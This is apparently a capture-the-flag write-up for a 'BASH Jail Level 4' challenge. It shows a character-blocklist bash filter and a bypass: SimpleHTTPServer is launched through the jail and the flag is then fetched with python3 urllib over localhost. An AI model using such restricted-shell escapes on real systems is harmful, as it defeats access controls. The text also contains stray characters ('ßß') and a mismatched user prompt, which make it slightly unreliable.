#BASH Jail Level 4:

```bash
Current user is uid=1003(level4) gid=1003(level4) groups=1003(level4)

Flag is located at /home/level4/flag.txt

Challenge bash code:
-----------------------------

WARNING: this prompt is launched using ./prompt.sh 2>/dev/null

# CHALLENGE

function check_space {
    if [[ $1 == *[bdksc'/''<''>''&''$']* ]]
    then
            return 0
    fi

    return 1
}ßß

while :
do
    echo "Your input:"
    read input
    if check_space "$input"
    then
        echo -e '\033[0;31mRestricted characters has been used\033[0m'
    else
        output=`$input < /dev/null` &>/dev/null
        echo "Command executed"
    fi
done

-----------------------------
```

Such as level 3, we can use python SimpleHTTPServer :)

```
Your input:
python -m SimpleHTTPServer
```


```bash
level1@lxc17-bash-jail:~$ python3 1>&0
Python 3.4.3 (default, Oct 14 2015, 20:28:29)
[GCC 4.8.4] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>>
KeyboardInterrupt
>>> import urllib.request
>>> urllib.request.urlopen("http://127.0.0.1:8000/flag.txt").read()
b'FLAG-*****\n'
```
